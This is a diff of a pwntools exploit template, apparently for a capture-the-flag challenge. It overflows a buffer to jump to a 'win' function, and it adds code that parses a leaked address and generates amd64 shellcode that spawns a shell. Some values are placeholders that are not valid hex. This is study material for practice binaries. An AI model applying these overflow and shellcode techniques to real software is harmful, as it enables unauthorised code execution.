@@ -11,7 +11,7 @@ p.recv()
 payload = b''
 payload+= (0xABCDE - 0xEFG + 0xBFR) * b'A' #figure out where you have to go, do the math in parenthesis!
 elf = ELF("./chall_##") #used to call the methods in system, other ways to do involve getting the addr, this works too
-payload += p32(elfsym.win)
+payload += p32(elf.sym.win)
 
 #make sure you send however many lines your input is expecting -1
 p.sendline("andyrulz")
@@ -21,4 +21,10 @@ p.sendline(payload)
 
 p.interactive()
 ls
+
+#some code to strip hex out with regular expressions
+import re
+re.findall(b"([a-f0-9]{8,16})",resp)[0]
+shellcodeAddr = p64(int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16))
+shellcode = asm(shellcraft.amd64.sh())
 
